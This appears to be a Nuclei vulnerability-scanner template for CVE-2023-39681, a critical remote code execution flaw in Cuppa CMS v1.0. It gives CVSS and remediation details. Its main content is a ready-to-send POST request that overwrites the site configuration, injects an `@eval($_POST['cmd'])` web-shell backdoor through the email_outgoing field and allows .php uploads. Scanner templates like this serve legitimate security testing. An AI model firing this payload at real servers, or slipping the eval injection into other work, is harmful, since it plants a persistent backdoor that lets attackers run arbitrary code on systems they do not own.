id: CVE-2023-39681

info:
  name: Cuppa CMS v1.0 RCE via email_outgoing parameter
  author: ProjectDiscoveryAI
  severity: critical
  description: Remote Code Execution (RCE) vulnerability in Cuppa CMS v1.0 via the email_outgoing parameter at /Configuration.php.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the server.
  remediation: |
    Upgrade Cuppa CMS to a patched version that addresses the RCE vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-39681
    cwe-id: CWE-94
    epss-score: 0.00657
    epss-percentile: 0.80137
    cpe: cpe:2.3:a:cuppacms:cuppacms:1.0:*:*:*:*:*:*:*
  metadata:
    vendor: cuppacms
    product: cuppacms

http:
  - method: POST
    path:
      - "{{BaseURL}}/classes/ajax/Functions.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      administrator_template=default&list_limit=25&font_list=Raleway&secure_login=0&secure_login_value=&secure_login_redirect=&language_default=en&country_default=us&global_encode=sha1Salt&global_encode_salt=1zSWYtL0Yn5e4Ps8MS9UERbmfznt7Ivq&ssl=0&lateral_menu=expanded&base_url=&auto_logout_time=30&redirect_to=false&host=localhost&db=cuppa&user=root&password=root&table_prefix=cu_&allowed_extensions=*.gif; *.jpg; *.jpeg; *.pdf; *.ico; *.png; *.svg;*.php&upload_default_path=upload_files&maximum_file_size=5242880&csv_column_separator=,&tinify_key=&email_outgoing=";}@eval($_POST['cmd']);class fc{//&forward=&smtp=0&email_host=&email_port=&email_password=&smtp_security=&code=
    matchers:
      - type: word
        words:
          - "Configuration updated successfully"
        part: body
